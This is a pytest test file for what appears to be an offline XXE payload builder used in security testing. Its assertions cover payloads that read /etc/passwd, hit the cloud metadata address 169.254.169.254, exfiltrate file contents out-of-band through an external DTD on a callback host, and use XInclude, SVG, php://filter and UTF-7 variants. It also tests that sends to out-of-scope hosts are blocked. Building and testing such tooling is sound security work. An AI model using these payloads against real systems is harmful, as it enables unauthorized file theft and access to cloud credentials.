"""Tests for the offline XXE payload builder (network path not exercised)."""

from __future__ import annotations

import json

import pytest

from tools.xxe_probe import build_payload, main


class TestKinds:
    def test_file_read(self):
        p = build_payload("file", path="/etc/passwd")
        assert "<!DOCTYPE foo" in p.xml
        assert 'SYSTEM "file:///etc/passwd"' in p.xml
        assert "&xxe;" in p.xml
        assert p.dtd == ""

    def test_ssrf(self):
        p = build_payload("ssrf", url="http://169.254.169.254/latest/meta-data/")
        assert "169.254.169.254" in p.xml
        assert "SYSTEM" in p.xml

    def test_ssrf_default_metadata(self):
        p = build_payload("ssrf")
        assert "169.254.169.254" in p.xml

    def test_oob_requires_callback(self):
        with pytest.raises(ValueError):
            build_payload("oob", path="/etc/passwd")

    def test_oob_xml_and_dtd(self):
        p = build_payload("oob", path="/etc/passwd", callback="https://abc.oast.fun")
        assert "abc.oast.fun/oob.dtd" in p.xml
        assert "file:///etc/passwd" in p.dtd
        assert "%file" in p.dtd
        assert "exfil" in p.dtd
        assert "abc.oast.fun" in p.dtd

    def test_xinclude(self):
        p = build_payload("xinclude", path="/etc/passwd")
        assert "xi:include" in p.xml
        assert "http://www.w3.org/2001/XInclude" in p.xml
        assert "file:///etc/passwd" in p.xml

    def test_svg(self):
        p = build_payload("svg", path="/etc/passwd")
        assert "<svg" in p.xml
        assert "&xxe;" in p.xml
        assert "file:///etc/passwd" in p.xml

    def test_php_filter(self):
        p = build_payload("php-filter")
        assert "php://filter/convert.base64-encode" in p.xml

    def test_utf7_roundtrip(self):
        p = build_payload("utf7", path="/etc/passwd")
        assert 'encoding="UTF-7"' in p.xml
        decoded = p.xml.encode("ascii").decode("utf-7")
        assert 'encoding="UTF-7"' in decoded
        assert "file:///etc/passwd" in decoded

    def test_unknown_kind(self):
        with pytest.raises(ValueError):
            build_payload("nope")


class TestCli:
    def test_json_output(self, capsys):
        rc = main(["--kind", "file", "--path", "/etc/hostname", "--json"])
        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert data["kind"] == "file"
        assert "/etc/hostname" in data["xml"]

    def test_out_writes_xml_and_dtd(self, tmp_path, capsys):
        out = tmp_path / "payload.xml"
        rc = main(["--kind", "oob", "--callback", "https://abc.oast.fun",
                   "--out", str(out)])
        assert rc == 0
        assert out.is_file()
        assert (tmp_path / "oob.dtd").is_file()
        assert "oob.dtd" in out.read_text()

    def test_missing_callback_errors(self, capsys):
        with pytest.raises(SystemExit):
            main(["--kind", "oob"])

    def test_out_of_scope_send_is_blocked(self, capsys):
        rc = main(["--kind", "file", "--send", "https://evil.example/x",
                   "--in-scope", "target.com"])
        assert rc == 1
        output = capsys.readouterr().out
        assert "out of scope" in output